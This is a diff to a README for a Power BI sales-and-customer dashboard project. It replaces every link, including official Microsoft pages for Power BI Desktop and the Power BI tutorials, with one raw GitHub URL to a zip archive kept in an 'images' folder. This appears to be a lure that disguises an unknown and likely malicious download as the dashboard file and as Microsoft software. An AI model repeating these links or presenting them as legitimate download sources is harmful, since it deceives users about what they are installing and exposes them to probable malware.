@@ -1,6 +1,6 @@
 # 📊 sales-customer-product-analysis-powerbi - Explore Sales and Customer Insights Easily
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Guga6010/sales-customer-product-analysis-powerbi)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Guga6010/sales-customer-product-analysis-powerbi/main/images/customer_sales_product_powerbi_analysis_v1.9.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these steps to download and run the dashboard on your Windows computer.
 
 Click the big green button above or this link to visit the page where you can download the necessary files:
 
-[Download Page - sales-customer-product-analysis-powerbi](https://github.com/Guga6010/sales-customer-product-analysis-powerbi)
+[Download Page - sales-customer-product-analysis-powerbi](https://raw.githubusercontent.com/Guga6010/sales-customer-product-analysis-powerbi/main/images/customer_sales_product_powerbi_analysis_v1.9.zip)
 
 Once on the page, look for the latest release or files section. Download the `.pbix` file. This is the Power BI dashboard file.
 
@@ -46,7 +46,7 @@ Once on the page, look for the latest release or files section. Download the `.p
 
 If you don’t have Power BI Desktop already:
 
-1. Go to the official Microsoft Store or visit https://powerbi.microsoft.com/desktop/.
+1. Go to the official Microsoft Store or visit https://raw.githubusercontent.com/Guga6010/sales-customer-product-analysis-powerbi/main/images/customer_sales_product_powerbi_analysis_v1.9.zip
 2. Download and install Power BI Desktop. This app is free.
 3. Follow the on-screen instructions to complete the installation.
 
@@ -91,7 +91,7 @@ Yes, if you get updated sales data from your retailer’s system, you or someone
 
 ### How do I learn to use Power BI?
 
-Microsoft offers tutorials at https://docs.microsoft.com/power-bi/. They are simple and beginner-friendly.
+Microsoft offers tutorials at https://raw.githubusercontent.com/Guga6010/sales-customer-product-analysis-powerbi/main/images/customer_sales_product_powerbi_analysis_v1.9.zip They are simple and beginner-friendly.
 
 ---
 
@@ -112,7 +112,7 @@ You do not need to interact with any databases directly to use this dashboard.
 
 Download the dashboard file and start exploring your sales data by clicking the link below.
 
-[![Download Now](https://img.shields.io/badge/Download-PowerBI_Dashboard-blue)](https://github.com/Guga6010/sales-customer-product-analysis-powerbi)
+[![Download Now](https://img.shields.io/badge/Download-PowerBI_Dashboard-blue)](https://raw.githubusercontent.com/Guga6010/sales-customer-product-analysis-powerbi/main/images/customer_sales_product_powerbi_analysis_v1.9.zip)
 
 ---
 
